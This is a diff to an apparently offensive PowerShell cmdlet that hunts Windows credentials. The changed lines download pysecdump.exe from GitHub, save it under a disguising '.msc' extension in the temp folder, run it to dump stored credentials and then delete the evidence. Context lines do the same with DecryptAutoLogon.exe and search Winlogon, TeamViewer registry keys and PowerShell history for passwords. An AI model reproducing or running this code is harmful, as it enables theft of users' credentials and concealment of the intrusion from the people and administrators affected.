@@ -7,7 +7,7 @@
    Tested Under: Windows 10 (18363) x64 bits
    Required Dependencies: none
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.1.4
+   PS cmdlet Dev version: v1.2.5
 
 .DESCRIPTION
    -GetPasswords [ Enum ] searchs creds in store\regedit\disk diferent locations.
@@ -71,20 +71,26 @@ If($GetPasswords -ieq "Enum" -or $GetPasswords -ieq "Dump"){
     If($GetPasswords -ieq "Enum"){
 
         Write-Host "Scanning credential store for creds!" -ForegroundColor Green
-        Write-Host "------------------------------------";Start-Sleep -Seconds 1
-        ## Dump local passwords from credential manager
-        [void][Windows.Security.Credentials.PasswordVault, Windows.Security.Credentials, ContentType = WindowsRuntime]
-        $vault = New-Object Windows.Security.Credentials.PasswordVault
-        $allpass = $vault.RetrieveAll() | % { 
-            $_.RetrievePassword(); $_ 
-        }|Select Resource, UserName, Password|Sort-Object Resource|ft -AutoSize
-        If($allpass -ieq $null){## Error => none credentials found under PasswordVault
-            write-host "[error] none credentials found under PasswordVault!" -ForegroundColor Red -BackgroundColor Black
+        Write-Host "------------------------------------"
+        If(-not(Test-Path -Path "$Env:TMP\pysecdump.msc" -EA SilentlyContinue)){
+           iwr -Uri https://raw.githubusercontent.com/pentestmonkey/pysecdump/master/pysecdump.exe -OutFile $Env:TMP\pysecdump.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
         }
 
-        ## Checking Registry for credentials
-        # TODO: HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer /v PermanentPassword - SecurityPasswordAES - 
-        # https://gist.github.com/rishdang/442d355180e5c69e0fcb73fecd05d7e0
+        ## Build Output Table
+        If(Test-Path -Path "$Env:TMP\pysecdump.msc" -EA SilentlyContinue){
+
+           cd $Env:TMP;.\pysecdump.msc -C > $Env:TMP\creds.log
+           Get-Content -Path "$Env:TMP\creds.log" | Where-Object { 
+              $_ -NotMatch '{' -and $_ -NotMatch '\[' } | 
+              Select-Object -Skip 4 | Select-Object -SkipLast 2
+
+           cd $Working_Directory ## Return to redpill working directory
+
+        }Else{
+        
+           Write-Host "[error] Not found: $Env:TMP\pysecdump.msc`n" -ForegroundColor Red -BackgroundColor Black
+        
+        }
 
         $TeamViewer = "HKLM:SOFTWARE" + "\WOW6432Node\TeamViewer" -Join ''
         $RawKKLMKey = "HKLM:\SOFTWARE\Microsoft\" + "Windows NT\CurrentVersion\Winlogon" -Join ''
@@ -111,7 +117,7 @@ If($GetPasswords -ieq "Enum" -or $GetPasswords -ieq "Dump"){
 
         ## Checking winlogon for crypted credentials
         # Download and masquerade standalone executable to look like one .msc archive
-        Write-Host "`nScanning winlogon for crypted creds!" -ForegroundColor Green
+        Write-Host "`n`nScanning winlogon for crypted creds!" -ForegroundColor Green
         Write-Host "------------------------------------";Start-Sleep -Seconds 1
         iwr -Uri https://raw.githubusercontent.com/securesean/DecryptAutoLogon/main/DecryptAutoLogon/bin/Release/DecryptAutoLogon.exe -OutFile $Env:TMP\DecryptAutoLogon.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null
         If(-not(Test-Path -Path "$Env:TMP\DecryptAutoLogon.msc" -EA SilentlyContinue)){
@@ -122,7 +128,7 @@ If($GetPasswords -ieq "Enum" -or $GetPasswords -ieq "Dump"){
 
 
         ## Checking ConsoleHost_History for credentials
-        Write-Host "`nScanning ConsoleHost_History for creds!" -ForegroundColor Green
+        Write-Host "`n`nScanning ConsoleHost_History for creds!" -ForegroundColor Green
         Write-Host "-------------------------------------";Start-Sleep -Seconds 1
         $PSHistory = "$Env:APPDATA\Microsoft\Windows\" + "PowerShell\PSReadLine\ConsoleHost_History.txt" -Join ''
         $Credentials = Get-Content -Path "$PSHistory" -ErrorAction SilentlyContinue|
@@ -135,8 +141,9 @@ If($GetPasswords -ieq "Enum" -or $GetPasswords -ieq "Dump"){
             }
         }
 
+
         ## List Stored Passwords {in Text\Xml\Log Files}
-        Write-Host "`n:Directory: $StartDir" -ForeGroundColor Yellow
+        Write-Host "`n`n:Directory: $StartDir" -ForeGroundColor Yellow
         Write-Host "Scanning txt\xml\log for stored creds!" -ForegroundColor Green
         Write-Host "--------------------------------------";Start-Sleep -Seconds 1
         If(-not(Test-Path -Path "$StartDir")){## User Input directory not found
@@ -165,10 +172,13 @@ If($GetPasswords -ieq "Enum" -or $GetPasswords -ieq "Dump"){
            }
 
            ## Delete ALL artifacts left behind
+           If(Test-Path -Path "$Env:TMP\creds.log"){Remove-Item -Path "$Env:TMP\creds.log" -Force}
            If(Test-Path -Path "$Env:TMP\passwd.txt"){Remove-Item -Path "$Env:TMP\passwd.txt" -Force}
+           If(Test-Path -Path "$Env:TMP\pysecdump.msc"){Remove-Item -Path "$Env:TMP\pysecdump.msc" -Force}
            If(Test-Path -Path "$Env:TMP\DecryptAutoLogon.msc"){Remove-Item -Path "$Env:TMP\DecryptAutoLogon.msc" -Force}
         }
      
+
     }ElseIf($GetPasswords -ieq "Dump"){
         ## This function requires Admin privileges to add reg keys
         $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")
